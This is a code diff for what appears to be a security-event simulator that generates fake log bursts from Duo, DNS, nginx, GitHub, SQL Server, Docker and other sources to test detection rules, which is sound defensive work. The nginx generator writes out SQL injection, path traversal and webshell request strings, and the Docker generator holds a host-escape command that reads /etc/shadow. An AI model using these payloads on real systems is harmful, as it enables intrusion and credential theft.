+          ccl: 'poor', activity: 'Upload', action: 'alert', objectName: 'customer_export_2026.csv',
+          objectType: 'File', bytes, dlpRule: 'PII-credit-card-numbers', dlpIncident: rand.hex(12),
+          nsSeverity: 'high', url: 'mega.nz/fm', site: 'MEGA',
+          threatSig: 'DLP: PII uploaded to unsanctioned cloud storage', threatSev: 'high',
+          threatTactic: 'Exfiltration', threatTechnique: 'T1567.002 · Exfiltration to Cloud Storage',
+          message: `Netskope DLP alert: ${who} uploaded customer_export_2026.csv (${(bytes / 1e6).toFixed(0)} MB) to unsanctioned cloud storage`,
+        }));
+        return evs;
+      },
+    },
+    duo: {
+      // Duo's Admin API authentication log is polled by a connector — 'api'.
+      label: 'Cisco Duo MFA', category: 'appliance', transport: 'api',
+      build() {
+        const who = rand.pick(USERS);
+        const base = () => ({
+          srcType: 'duo', vendor: 'duo', host: 'duo-connector-01', facility: FACILITY.local6,
+          program: 'duo_auth', severity: 6, proto: 'tcp', user: who, actorId: `DU${rand.hex(18).toUpperCase()}`,
+          eventUuid: rand.uuid(), appName: rand.pick(['Corp VPN', 'Okta SSO', 'RDP Gateway']),
+          appId: `DI${rand.hex(18).toUpperCase()}`, browser: 'Chrome', clientOs: 'Windows 10',
+          authDevice: `+61 XXX XXX ${rand.int(100, 999)}`,
+        });
+        const evs = [];
+        for (let i = 0, n = rand.int(2, 3); i < n; i++) {
+          evs.push(Object.assign(base(), {
+            factor: rand.pick(['duo_push', 'passcode']), outcome: 'success', duoReason: 'user_approved',
+            srcIp: rand.ip(), city: 'Sydney', country: 'Australia',
+            message: `Duo authentication success for ${who} (user_approved)`,
+          }));
+        }
+        // Push bombing: the attacker holds a valid password and keeps pushing.
+        // No signature here either — the mfa-fatigue rule counts the denials.
+        const a = rand.pick(THREAT_INTEL.ips);
+        for (let i = 0, n = rand.int(7, 11); i < n; i++) {
+          evs.push(Object.assign(base(), {
+            severity: 4, factor: 'duo_push', outcome: 'denied', duoReason: 'user_declined',
+            srcIp: a, city: 'Moscow', country: 'Russia',
+            message: `Duo authentication denied for ${who} — user_declined push from Moscow/Russia`,
+          }));
+        }
+        return evs;
+      },
+    },
+    windns: {
+      // The DNS Server analytic channel is an ETW trace on the DC; a forwarding
+      // agent is what turns it into syslog — transport 'agent'.
+      label: 'Windows DNS Server', category: 'appliance', transport: 'agent',
+      build() {
+        const h = { name: 'WIN-DC01', ip: '10.10.3.10' };
+        const base = () => ({
+          srcType: 'windns', vendor: 'windns', host: h.name, hostIp: h.ip,
+          facility: FACILITY.local5, program: 'DNSServer', severity: 6, proto: 'udp',
+          eventId: 257, dnsTask: 'RESPONSE_SUCCESS', qtype: 'A', rcode: 'NOERROR',
+        });
+        const evs = [];
+        for (let i = 0, n = rand.int(3, 5); i < n; i++) {
+          const dom = rand.pick(DOMAINS);
+          evs.push(Object.assign(base(), {
+            srcIp: rand.internalIp(), srcPort: rand.int(49152, 65535), domain: dom,
+            qtype: rand.pick(['A', 'AAAA', 'SRV']), answer: rand.internalIp(),
+            message: `DNS RESPONSE_SUCCESS ${dom} A`,
+          }));
+        }
+        // A long chain of unique TXT labels under one zone is tunnelling; the
+        // dns-tunneling rule correlates the burst into a single alert.
+        const zone = rand.pick(THREAT_INTEL.domains);
+        const victim = rand.internalIp();
+        for (let i = 0, n = rand.int(12, 18); i < n; i++) {
+          const label = rand.hex(46);
+          evs.push(Object.assign(base(), {
+            severity: 4, eventId: 256, dnsTask: 'QUERY_RECEIVED', qtype: 'TXT', rcode: undefined,
+            srcIp: victim, srcPort: rand.int(49152, 65535), domain: `${label}.${zone}`,
+            message: `DNS QUERY_RECEIVED ${label}.${zone} TXT`,
+          }));
+        }
+        return evs;
+      },
+    },
+    nginx: {
+      // nginx writes syslog itself (access_log syslog:server=…), so this one
+      // really is native — no agent in the path.
+      label: 'nginx (web)', category: 'appliance',
+      build() {
+        const h = rand.pick(HOSTS.web);
+        const base = () => ({
+          srcType: 'nginx', vendor: 'nginx', host: h.name, hostIp: h.ip,
+          facility: FACILITY.local1, program: 'nginx', severity: 6, proto: 'tcp',
+          userAgent: rand.pick(AGENTS), httpVersion: '1.1',
+        });
+        const evs = [];
+        for (let i = 0, n = rand.int(4, 6); i < n; i++) {
+          const status = rand.pick([200, 200, 200, 204, 301, 404]);
+          evs.push(Object.assign(base(), {
+            severity: status >= 400 ? 4 : 6, srcIp: rand.ip(), method: rand.pick(['GET', 'GET', 'POST']),
+            url: rand.pick(URLS), status, bytes: rand.int(200, 45000),
+            requestTime: (rand.int(5, 240) / 1000).toFixed(3),
+            message: `${rand.pick(['GET', 'POST'])} ${rand.pick(URLS)} ${status}`,
+          }));
+        }
+        // The web-exploit rule reads the URL, so the payload has to be in it.
+        const a = rand.pick(THREAT_INTEL.ips);
+        const hit = rand.pick([
+          ["/api/v1/users?id=1' UNION SELECT username,password FROM users--", 500],
+          ['/download?file=../../../../etc/passwd', 200],
+          ['/uploads/shell.php?cmd=whoami', 200],
+        ]);
+        evs.push(Object.assign(base(), {
+          severity: 3, srcIp: a, method: 'GET', url: hit[0], status: hit[1], bytes: rand.int(0, 900),
+          userAgent: rand.pick(['sqlmap/1.7', 'python-requests/2.31.0']),
+          message: `${a} - - "GET ${hit[0]} HTTP/1.1" ${hit[1]}`,
+        }));
+        return evs;
+      },
+    },
+    github: {
+      // The Enterprise audit log is read from the REST API or streamed to a
+      // bucket — nothing arrives over syslog, so transport is 'api'.
+      label: 'GitHub audit', category: 'appliance', transport: 'api',
+      build() {
+        const org = 'corp-eng';
+        const repo = `${org}/${rand.pick(['payments-api', 'platform-infra', 'web-frontend'])}`;
+        const base = () => ({
+          srcType: 'github', vendor: 'github', host: 'github-connector-01',
+          facility: FACILITY.local6, program: 'github_audit', severity: 6, proto: 'tcp',
+          org, repo, eventUuid: rand.uuid(), actorId: String(rand.int(1000000, 9999999)),
+          userAgent: 'GitHub-Hookshot/f1a2b3c',
+        });
+        const evs = [];
+        for (let i = 0, n = rand.int(2, 3); i < n; i++) {
+          evs.push(Object.assign(base(), {
+            ghAction: rand.pick(['pull_request.create', 'pull_request.merge', 'repo.access']),
+            user: rand.pick(['jdoe', 'asmith', 'mchen']), srcIp: rand.ip(),
+            message: 'GitHub: pull request activity',
+          }));
+        }
+        // Workflow tampering on a self-hosted runner: the pipeline becomes the
+        // execution primitive, which is what T1677 describes.
+        const a = rand.pick(THREAT_INTEL.ips);
+        evs.push(Object.assign(base(), {
+          severity: 3, ghAction: 'workflows.updated_workflow_file', user: 'contractor-ci',
+          srcIp: a, branch: 'main', workflowName: '.github/workflows/release.yml',
+          workflowId: String(rand.int(10000000, 99999999)), operationType: 'modify',
+          message: 'GitHub: release.yml workflow modified on main — added a step that curls an external script into bash',
+        }));
+        evs.push(Object.assign(base(), {
+          severity: 2, ghAction: 'workflows.completed_workflow_run', user: 'contractor-ci',
+          srcIp: a, branch: 'main', workflowName: '.github/workflows/release.yml',
+          workflowRunId: String(rand.int(10000000000, 99999999999)),
+          runnerGroup: 'self-hosted-prod', runnerName: 'runner-prod-03',
+          message: 'GitHub: release.yml ran on self-hosted runner runner-prod-03 and read 6 repository secrets',
+        }));
+        return evs;
+      },
+    },
+    mssql: {
+      // SQL Server Audit writes to a file or the Windows Security log; an agent
+      // is what forwards it — transport 'agent'.
+      label: 'SQL Server audit', category: 'appliance', transport: 'agent',
+      build() {
+        const dbHost = 'WIN-SQL01';
+        const base = () => ({
+          srcType: 'mssql', vendor: 'mssql', host: dbHost, hostIp: '10.10.2.31',
+          facility: FACILITY.local5, program: 'MSSQLSERVER', severity: 6, proto: 'tcp',
+          dbName: 'CRM_PROD', schemaName: 'dbo', classType: 'U ', actionId: 'SL',
+          clientHost: rand.pick(['WIN-FS02', 'WIN-APP04']),
+        });
+        const evs = [];
+        for (let i = 0, n = rand.int(3, 4); i < n; i++) {
+          evs.push(Object.assign(base(), {
+            user: 'CORP\\svc_crmapp', objectName: rand.pick(['Orders', 'Sessions', 'AuditTrail']),
+            appName: '.Net SqlClient Data Provider', srcIp: '10.10.1.12', rows: rand.int(1, 40),
+            statement: `SELECT TOP 50 * FROM dbo.${rand.pick(['Orders', 'Sessions'])} WHERE ModifiedAt > @p0`,
+            message: 'MSSQL SELECT by svc_crmapp',
+          }));
+        }
+        // A person, not the service account, pulling whole tables out of the
+        // repository — the db-repository rule counts the rows and the tables.
+        const who = rand.pick(['CORP\\contractor', 'CORP\\jdoe']);
+        const client = rand.internalIp();
+        ['Customers', 'CreditCards', 'Employees', 'Salaries'].forEach((tbl) => {
+          evs.push(Object.assign(base(), {
+            severity: 4, user: who, objectName: tbl, appName: rand.pick(['Microsoft SQL Server Management Studio', 'bcp.exe']),
+            srcIp: client, rows: rand.int(120000, 900000),
+            statement: `SELECT * FROM dbo.${tbl}`,
+            message: `MSSQL SELECT * FROM dbo.${tbl} by ${who.replace('CORP\\', '')}`,
+          }));
+        });
+        return evs;
+      },
+    },
+    docker: {
+      // Daemon and Engine-API events come off the socket, not syslog; a
+      // container-runtime agent is what ships them — transport 'agent'.
+      label: 'Docker runtime', category: 'appliance', transport: 'agent',
+      build() {
+        const hostName = 'docker-node-02';
+        const base = () => ({
+          srcType: 'docker', vendor: 'docker', host: hostName, hostIp: '10.20.1.22',
+          facility: FACILITY.local6, program: 'dockerd', severity: 6, proto: 'tcp',
+          srcIp: '/var/run/docker.sock', project: 'corp-stack',
+        });
+        const evs = [];
+        for (let i = 0, n = rand.int(3, 4); i < n; i++) {
+          const name = rand.pick(['billing-api', 'redis-cache', 'nginx-edge']);
+          evs.push(Object.assign(base(), {
+            dockerAction: rand.pick(['start', 'die', 'health_status: healthy']),
+            containerId: rand.hex(64), containerName: name, image: `registry.corp.local/${name}:1.14.2`,
+            message: `docker container start ${name}`,
+          }));
+        }
+        // A privileged container mounting the host root, then a shell exec'd into
+        // it over the API — the container-runtime rule correlates the pair.
+        const id = rand.hex(64);
+        evs.push(Object.assign(base(), {
+          severity: 3, dockerAction: 'create', containerId: id, containerName: 'debug-tools',
+          image: 'alpine:latest', privileged: true, mounts: '/:/host',
+          message: 'docker container create debug-tools (alpine:latest) --privileged -v /:/host',
+        }));
+        evs.push(Object.assign(base(), {
+          severity: 2, dockerAction: 'exec_create', containerId: id, containerName: 'debug-tools',
+          image: 'alpine:latest', privileged: true, user: 'root',
+          srcIp: rand.internalIp(), cmdLine: 'chroot /host /bin/sh -c "cat /etc/shadow"',
+          message: 'docker exec_create debug-tools: chroot /host /bin/sh -c "cat /etc/shadow"',
+        }));
+        return evs;
+      },
+    },
+    ocsf: {
+      // OCSF is a schema, not a wire format: Security Lake writes it to S3 and a
+      // connector re-emits it, so this source is 'api' rather than native syslog.
+      label: 'OCSF (generic)', category: 'appliance', transport: 'api',
+      build() {
+        const base = () => ({
+          srcType: 'ocsf', vendor: 'ocsf', host: 'ocsf-connector-01', hostIp: '10.10.0.61',
+          facility: FACILITY.local2, program: 'ocsf', severity: 6, proto: 'tcp',
+          vendorName: 'AWS', productName: 'Amazon Security Lake', ocsfLogName: 'security_lake',
+        });
+        const evs = [];
+        for (let i = 0, n = rand.int(2, 3); i < n; i++) {
+          evs.push(Object.assign(base(), {
+            classUid: 4001, className: 'Network Activity', categoryUid: 4, categoryName: 'Network Activity',
+            activityId: 1, activityName: 'Open', ocsfSeverityId: 1, ocsfSeverity: 'Informational',
+            srcIp: rand.internalIp(), dstIp: rand.ip(), srcPort: rand.int(32768, 60999), dstPort: 443,
+            message: 'Network Activity: connection opened',
+          }));
+        }
+        const f = rand.pick([
+          ['Malware found on endpoint', 'T1204 · User Execution', 'Execution', 'high', 4],
+          ['Credential access attempt blocked', 'T1003 · OS Credential Dumping', 'Credential Access', 'critical', 5],
+          ['Impossible travel detected for user', 'T1078 · Valid Accounts', 'Initial Access', 'high', 4],
+        ]);
+        evs.push(Object.assign(base(), {
+          severity: f[4] >= 5 ? 2 : 3,
+          classUid: 2001, className: 'Security Finding', categoryUid: 2, categoryName: 'Findings',
+          activityId: 1, activityName: 'Create', ocsfSeverityId: f[4], ocsfSeverity: f[3] === 'critical' ? 'Critical' : 'High',
+          ocsfProfiles: ['host', 'security_control'], findingId: rand.uuid(), findingCategory: 'TTPs',
+          user: rand.pick(USERS), srcIp: rand.pick(THREAT_INTEL.ips), dstIp: rand.internalIp(),
+          threatSig: f[0], threatSev: f[3], threatTactic: f[2], threatTechnique: f[1],
+          unmapped: { native_severity: f[3].toUpperCase() },
+          message: `OCSF Security Finding: ${f[0]}`,
+        }));
+        return evs;
+      },
+    },
   };
   Object.assign(SCENARIOS, APPLIANCE);
 
@@ -3306,8 +4092,14 @@
       const events = scenario.build();
       // Spread the burst over a short window so correlation windows see it live.
       // Scenarios can be injected even while the baseline is stopped.
-      events.forEach((partial, i) => {
-        setTimeout(() => this._finalize(partial), i * rand.int(30, 90));
+      // The delay accumulates rather than being `i * random`: with a fresh
+      // random gap per index a later event can be scheduled ahead of an earlier
+      // one, and a rule that needs the order (failures before the accept, the
+      // workflow edit before the run) then misses its own burst.
+      let at = 0;
+      events.forEach((partial) => {
+        setTimeout(() => this._finalize(partial), at);
+        at += rand.int(30, 90);
       });
     }
 
